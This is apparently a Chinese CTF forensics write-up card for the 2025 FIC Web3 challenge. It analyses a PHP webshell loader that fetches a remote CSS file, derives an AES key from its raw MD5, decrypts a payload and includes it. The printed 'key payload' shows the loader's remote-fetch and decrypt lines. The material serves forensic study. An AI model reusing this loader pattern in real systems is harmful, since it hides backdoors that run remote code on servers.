---
title: "Web3 互联网取证—2025 FIC 晋级赛"
category: web
tags: ["2025 FIC 互联网取证晋级赛", "web", "php_file_get_contents", "md5_true_raw_binary", "aes_256_cbc_decrypt", "openssl_raw_data"]
signals: ["2025 FIC 互联网取证晋级赛 2025", "php_file_get_contents", "md5_true_raw_binary", "aes_256_cbc_decrypt", "openssl_raw_data", "php_included_shortcut", "web3_domain", "url_encoded_path", "foren6_atwebpages", "web_unknown", "FIC", "Web3", "PHP", "URL"]
difficulty: medium
source: "https://www.ctfiot.com/243688.html"
tools: ["PHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# Web3 互联网取证—2025 FIC 晋级赛

> 赛事：2025 FIC 互联网取证晋级赛 2025 | 方向：web | 难度：medium | 工具：PHP

## 一句话总结

2025 FIC 晋级赛 Web3 取证 PHP 一话木马分析，URL 编码的中文路径蜂蜜锅底.css 作密钥种子 + md5 raw + AES-256-CBC 解密 + include 一话木马。

## 攻击链

1. file_get_contents('https://foren6.atwebpages.com/woyao/eat/火锅/蜂蜜锅底.css') → md5($a, true) raw 16 字节作 AES 密钥 → base64_decode(./encrypted.bin) → openssl_cipher_iv_length('aes-256-cbc') 取 IV → openssl_decrypt($h, 'aes-256-cbc', $b, OPENSSL_RAW_DATA, $g) → echo $i → 早期为 include + 临时目录一话木马

## 关键 payload

```
$a=file_get_contents('https://foren6.atwebpages.com/woyao/eat/火锅/蜂蜜锅底.css') / $b=md5($a,true) / $e='aes-256-cbc' / openssl_decrypt($h, $e, $b, OPENSSL_RAW_DATA, $g)
```

## 经验教训

PHP md5($a, true) 返回 16 字节原始二进制可作 AES-128 密钥；file_get_contents 支持中文 URL 编码路径，CSS 文件作密钥种子是创意取证点。

## 标签

php_file_get_contents、md5_true_raw_binary、aes_256_cbc_decrypt、openssl_raw_data、php_included_shortcut、web3_domain、url_encoded_path、foren6_atwebpages、honey_pot_base

## 参考来源

- https://www.ctfiot.com/243688.html
- 原文件：Web3互联网取证—2025FIC晋级赛.full.md
